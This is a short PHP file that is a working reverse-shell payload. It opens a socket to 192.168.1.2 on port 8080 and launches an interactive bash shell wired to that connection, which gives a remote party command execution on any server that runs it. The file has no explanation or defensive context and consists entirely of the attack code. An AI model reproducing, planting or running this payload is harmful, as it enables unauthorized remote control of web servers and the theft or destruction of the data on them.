<?php

$sock=fsockopen("192.168.1.2",8080);
exec("bash -i <&3 >&3 2>&3");

?>